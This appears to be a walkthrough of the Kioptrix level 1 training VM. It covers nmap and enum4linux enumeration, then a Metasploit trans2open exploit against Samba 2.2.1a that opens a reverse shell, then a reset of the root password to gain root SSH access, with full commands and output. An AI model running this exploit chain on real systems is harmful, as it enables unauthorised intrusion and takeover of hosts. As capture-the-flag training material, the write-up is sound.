
## Description:

This Kioptrix VM Image are easy challenges. 
The goal is to gain root access by any means necessary (except actually hacking the VM server or player).
The goal of these games is to teach you the fundamental tools and strategies for assessing and exploiting vulnerabilities.
There are a variety of approaches to completing the challenges.

### stage one - enumeration:

first we need to find the machine - which is a vmware workstation image

so quick nmap scan
nmap 192.168.1.0/24

**replacing  your network for what is above

result:

Nmap scan report for 192.168.1.101
Host is up (0.00024s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
443/tcp  open  https
1024/tcp open  kdm
MAC Address: 00:0C:29:7C:3A:16 (VMware)

so the box is one 192.168.1.101 and has a few open ports

### attempt access

so 22 is open should try root without password (will never work, but should try!)
via putty:
login as: root
root@192.168.1.101's password:
failed - so move on

#### quick vuln scan via nmap (why not!)
sudo nmap -sV --script=vuln* 192.168.1.101

#### output

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 10:47 EDT
Nmap scan report for 192.168.1.101
Host is up (0.0025s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| vulners: 
|   cpe:/a:openbsd:openssh:2.9p2: 
|       CVE-2002-0640   10.0    https://vulners.com/cve/CVE-2002-0640
|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639
|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083
|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895
|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051
|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924
|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/      7.5     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/ 7.5     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2010-4252/       *EXPLOIT*
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575
|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459
|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380
|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816
|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956
|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529
|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*
|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT*
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243
|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052
|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT*
|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT*
|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3 *EXPLOIT*
|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT*
|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/     *EXPLOIT*
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|       MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/  1.2     https://vulners.com/metasploit/MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/        *EXPLOIT*
|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953
|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608
|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499
|       SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488
|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474
|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439
|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344
|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262
|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| vulners: 
|   cpe:/a:apache:http_server:1.3.20: 
|       MSF:ILITIES/LINUXRPM-RHSA-2010-0602/    10.0    https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2010-0602/  *EXPLOIT*
|       SSV:72403       7.8     https://vulners.com/seebug/SSV:72403    *EXPLOIT*
|       SSV:26043       7.8     https://vulners.com/seebug/SSV:26043    *EXPLOIT*
|       SSV:20899       7.8     https://vulners.com/seebug/SSV:20899    *EXPLOIT*
|       PACKETSTORM:126851      7.8     https://vulners.com/packetstorm/PACKETSTORM:126851      *EXPLOIT*
|       PACKETSTORM:123527      7.8     https://vulners.com/packetstorm/PACKETSTORM:123527      *EXPLOIT*
|       PACKETSTORM:122962      7.8     https://vulners.com/packetstorm/PACKETSTORM:122962      *EXPLOIT*
|       MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS 7.8     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS       *EXPLOIT*
|       EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83    7.8     https://vulners.com/exploitpack/EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83 *EXPLOIT*
|       EDB-ID:18221    7.8     https://vulners.com/exploitdb/EDB-ID:18221      *EXPLOIT*
|       CVE-2011-3192   7.8     https://vulners.com/cve/CVE-2011-3192
|       CVE-2002-2272   7.8     https://vulners.com/cve/CVE-2002-2272
|       1337DAY-ID-21170        7.8     https://vulners.com/zdt/1337DAY-ID-21170        *EXPLOIT*
|       SSV:60913       7.5     https://vulners.com/seebug/SSV:60913    *EXPLOIT*
|       SAINT:CE48F764F3535D6A2E3CBFC45B9F2609  7.5     https://vulners.com/saint/SAINT:CE48F764F3535D6A2E3CBFC45B9F2609     *EXPLOIT*
|       SAINT:B6E89161F5A85A6F227960760297B726  7.5     https://vulners.com/saint/SAINT:B6E89161F5A85A6F227960760297B726     *EXPLOIT*
|       SAINT:66E6068403B214B34CB01EE316C37B76  7.5     https://vulners.com/saint/SAINT:66E6068403B214B34CB01EE316C37B76     *EXPLOIT*
|       SAINT:399EF180849727C5C8C2DB4378F050B0  7.5     https://vulners.com/saint/SAINT:399EF180849727C5C8C2DB4378F050B0     *EXPLOIT*
|       PACKETSTORM:82996       7.5     https://vulners.com/packetstorm/PACKETSTORM:82996       *EXPLOIT*
|       MSF:EXPLOIT/WINDOWS/HTTP/APACHE_CHUNKED 7.5     https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/APACHE_CHUNKED       *EXPLOIT*
|       CVE-2013-2249   7.5     https://vulners.com/cve/CVE-2013-2249
|       CVE-2004-1082   7.5     https://vulners.com/cve/CVE-2004-1082
|       CVE-2004-0488   7.5     https://vulners.com/cve/CVE-2004-0488
|       CVE-2003-0993   7.5     https://vulners.com/cve/CVE-2003-0993
|       CVE-2003-0987   7.5     https://vulners.com/cve/CVE-2003-0987
|       CVE-2002-2029   7.5     https://vulners.com/cve/CVE-2002-2029
|       CVE-2002-0843   7.5     https://vulners.com/cve/CVE-2002-0843
|       CVE-2002-0392   7.5     https://vulners.com/cve/CVE-2002-0392
|       CVE-2002-0257   7.5     https://vulners.com/cve/CVE-2002-0257
|       APACHECHUNK_WIN32       7.5     https://vulners.com/canvas/APACHECHUNK_WIN32    *EXPLOIT*
|       CVE-2003-0542   7.2     https://vulners.com/cve/CVE-2003-0542
|       CVE-2002-0839   7.2     https://vulners.com/cve/CVE-2002-0839
|       SSV:11802       7.1     https://vulners.com/seebug/SSV:11802    *EXPLOIT*
|       SSV:11762       7.1     https://vulners.com/seebug/SSV:11762    *EXPLOIT*
|       CVE-2009-1891   7.1     https://vulners.com/cve/CVE-2009-1891
|       CVE-2009-1890   7.1     https://vulners.com/cve/CVE-2009-1890
|       SSV:60427       6.9     https://vulners.com/seebug/SSV:60427    *EXPLOIT*
|       SSV:60386       6.9     https://vulners.com/seebug/SSV:60386    *EXPLOIT*
|       SSV:60069       6.9     https://vulners.com/seebug/SSV:60069    *EXPLOIT*
|       CVE-2012-0883   6.9     https://vulners.com/cve/CVE-2012-0883
|       CVE-2004-0940   6.9     https://vulners.com/cve/CVE-2004-0940
|       SSV:19019       6.8     https://vulners.com/seebug/SSV:19019    *EXPLOIT*
|       CVE-2010-0010   6.8     https://vulners.com/cve/CVE-2010-0010
|       CVE-2002-0840   6.8     https://vulners.com/cve/CVE-2002-0840
|       MSF:AUXILIARY/DOS/HTTP/SLOWLORIS        6.4     https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/SLOWLORIS      *EXPLOIT*
|       SSV:66957       5.0     https://vulners.com/seebug/SSV:66957    *EXPLOIT*
|       SSV:4148        5.0     https://vulners.com/seebug/SSV:4148     *EXPLOIT*
|       SSV:20993       5.0     https://vulners.com/seebug/SSV:20993    *EXPLOIT*
|       SSV:20979       5.0     https://vulners.com/seebug/SSV:20979    *EXPLOIT*
|       SSV:20969       5.0     https://vulners.com/seebug/SSV:20969    *EXPLOIT*
|       SSV:17994       5.0     https://vulners.com/seebug/SSV:17994    *EXPLOIT*
|       SSV:14432       5.0     https://vulners.com/seebug/SSV:14432    *EXPLOIT*
|       PACKETSTORM:85018       5.0     https://vulners.com/packetstorm/PACKETSTORM:85018       *EXPLOIT*
|       PACKETSTORM:82197       5.0     https://vulners.com/packetstorm/PACKETSTORM:82197       *EXPLOIT*
|       PACKETSTORM:105672      5.0     https://vulners.com/packetstorm/PACKETSTORM:105672      *EXPLOIT*
|       PACKETSTORM:105591      5.0     https://vulners.com/packetstorm/PACKETSTORM:105591      *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-16228/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-16228/    *EXPLOIT*
|       MSF:ILITIES/APPLE-OSX-WEBSERVER-CVE-2007-6750/  5.0     https://vulners.com/metasploit/MSF:ILITIES/APPLE-OSX-WEBSERVER-CVE-2007-6750/        *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/HTTP/REWRITE_PROXY_BYPASS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/REWRITE_PROXY_BYPASS       *EXPLOIT*
|       EXPLOITPACK:460143F0ACAE117DD79BD75EDFDA154B    5.0     https://vulners.com/exploitpack/EXPLOITPACK:460143F0ACAE117DD79BD75EDFDA154B *EXPLOIT*
|       EXPLOITPACK:44DAC602FB30402C58970DFAB1C4AF87    5.0     https://vulners.com/exploitpack/EXPLOITPACK:44DAC602FB30402C58970DFAB1C4AF87 *EXPLOIT*
|       EDB-ID:9887     5.0     https://vulners.com/exploitdb/EDB-ID:9887       *EXPLOIT*
|       EDB-ID:17969    5.0     https://vulners.com/exploitdb/EDB-ID:17969      *EXPLOIT*
|       CVE-2011-3368   5.0     https://vulners.com/cve/CVE-2011-3368
|       CVE-2007-6750   5.0     https://vulners.com/cve/CVE-2007-6750
|       CVE-2004-0263   5.0     https://vulners.com/cve/CVE-2004-0263
|       CVE-2003-0460   5.0     https://vulners.com/cve/CVE-2003-0460
|       CVE-2003-0083   5.0     https://vulners.com/cve/CVE-2003-0083
|       CVE-2003-0020   5.0     https://vulners.com/cve/CVE-2003-0020
|       CVE-2002-2103   5.0     https://vulners.com/cve/CVE-2002-2103
|       CVE-2001-1556   5.0     https://vulners.com/cve/CVE-2001-1556
|       CVE-2001-0731   5.0     https://vulners.com/cve/CVE-2001-0731
|       CVE-2001-0730   5.0     https://vulners.com/cve/CVE-2001-0730
|       CVE-2001-0729   5.0     https://vulners.com/cve/CVE-2001-0729
|       SSV:30024       4.6     https://vulners.com/seebug/SSV:30024    *EXPLOIT*
|       CVE-2012-0031   4.6     https://vulners.com/cve/CVE-2012-0031
|       CVE-2002-1658   4.6     https://vulners.com/cve/CVE-2002-1658
|       1337DAY-ID-27465        4.6     https://vulners.com/zdt/1337DAY-ID-27465        *EXPLOIT*
|       SSV:71772       4.3     https://vulners.com/seebug/SSV:71772    *EXPLOIT*
|       SSV:24250       4.3     https://vulners.com/seebug/SSV:24250    *EXPLOIT*
|       SSV:20934       4.3     https://vulners.com/seebug/SSV:20934    *EXPLOIT*
|       SSV:20555       4.3     https://vulners.com/seebug/SSV:20555    *EXPLOIT*
|       PACKETSTORM:61420       4.3     https://vulners.com/packetstorm/PACKETSTORM:61420       *EXPLOIT*
|       PACKETSTORM:102234      4.3     https://vulners.com/packetstorm/PACKETSTORM:102234      *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2011-0419/      4.3     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2011-0419/    *EXPLOIT*
|       MSF:ILITIES/HPSMH-CVE-2011-0419/        4.3     https://vulners.com/metasploit/MSF:ILITIES/HPSMH-CVE-2011-0419/      *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2011-0419/ 4.3     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2011-0419/       *EXPLOIT*
|       MSF:ILITIES/APPLE-OSX-APACHE-CVE-2011-0419/     4.3     https://vulners.com/metasploit/MSF:ILITIES/APPLE-OSX-APACHE-CVE-2011-0419/   *EXPLOIT*
|       EXPLOITPACK:FDCB3D93694E48CD5EE27CE55D6801DE    4.3     https://vulners.com/exploitpack/EXPLOITPACK:FDCB3D93694E48CD5EE27CE55D6801DE *EXPLOIT*
|       EXPLOITPACK:683C3B1D02827D6B32706DB1D146B2D8    4.3     https://vulners.com/exploitpack/EXPLOITPACK:683C3B1D02827D6B32706DB1D146B2D8 *EXPLOIT*
|       EDB-ID:35738    4.3     https://vulners.com/exploitdb/EDB-ID:35738      *EXPLOIT*
|       EDB-ID:17393    4.3     https://vulners.com/exploitdb/EDB-ID:17393      *EXPLOIT*
|       CVE-2011-4317   4.3     https://vulners.com/cve/CVE-2011-4317
|       CVE-2011-3348   4.3     https://vulners.com/cve/CVE-2011-3348
|       CVE-2011-0419   4.3     https://vulners.com/cve/CVE-2011-0419
|       CVE-2008-0455   4.3     https://vulners.com/cve/CVE-2008-0455
|       CVE-2006-3918   4.3     https://vulners.com/cve/CVE-2006-3918
|       CVE-2005-3352   4.3     https://vulners.com/cve/CVE-2005-3352
|       CVE-2008-0456   2.6     https://vulners.com/cve/CVE-2008-0456
|       CVE-2002-1233   2.6     https://vulners.com/cve/CVE-2002-1233
|_      CVE-2001-1534   2.1     https://vulners.com/cve/CVE-2001-1534
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:3A:16 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.61 seconds

so some items listed

note i can see smb - so lets try that:
first lets scan it to see what we can get:

enum4linux -a 192.168.1.101

this returns a lot:

but version is not enumerated


OS information on 192.168.1.101  
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.1.101 from smbclient: 
[+] Got OS info for 192.168.1.101 from srvinfo:
        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
        platform_id     :       500
        os version      :       4.5
        server type     :       0x9a03

## msfconsole - metasploit

so we can use msf to ident this:
msfconsole
use auxiliary/scanner/smb/smb_version
set rhost 192.168.1.101
run

which returns this: 
192.168.1.101:139     -   Host could not be identified: Unix (Samba 2.2.1a)

so a quick google:
and we land on: https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/

and at the bottom this is also built into msf, and guide at bottom of that page
msfconsole 
use exploit/linux/samba/trans2open
set payload generic/shell_reverse_tcp
set rhosts 192.168.1.101
exploit

### output:
msf6 exploit(linux/samba/trans2open) >  set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.1.97:4444 
[*] 192.168.1.101:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.101:139 - Trying return address 0xbffffafc...
[*] 192.168.1.101:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff8fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff7fc...
[*] 192.168.1.101:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.1.97:4444 -> 192.168.1.101:1041 ) at 2022-03-18 11:17:48 -0400

[*] Command shell session 6 opened (192.168.1.97:4444 -> 192.168.1.101:1042 ) at 2022-03-18 11:17:49 -0400
[*] Command shell session 7 opened (192.168.1.97:4444 -> 192.168.1.101:1043 ) at 2022-03-18 11:17:50 -0400
[*] Command shell session 8 opened (192.168.1.97:4444 -> 192.168.1.101:1044 ) at 2022-03-18 11:17:52 -0400

so at this point we have reverse shell:

so doing:
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash

so we have a root account (which is obvious, but its wise to check?)
 lets cat the sshd config file
 
 cat /etc/ssh/sshd_config
 
 so from that (clipped)
 
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords no

so root can do ssh logins, using a password

so lets just change the root password:

passwd
New password: password
BAD PASSWORD: it is based on a dictionary word
Retype new password: password
passwd: all authentication tokens updated successfully

and then try to login again:

login as: root
root@192.168.1.101's password:
Last login: Fri Mar 18 10:32:02 2022 from clientpc-adriand.fritz.box
[root@kioptrix root]#

and there we go - logged is as root

## conclusion 
this is not an hard box to access.
note i think the way this is setup i.e. old version of apache etc... then this is just one way to access this box. so a revisit to exploit these would be better
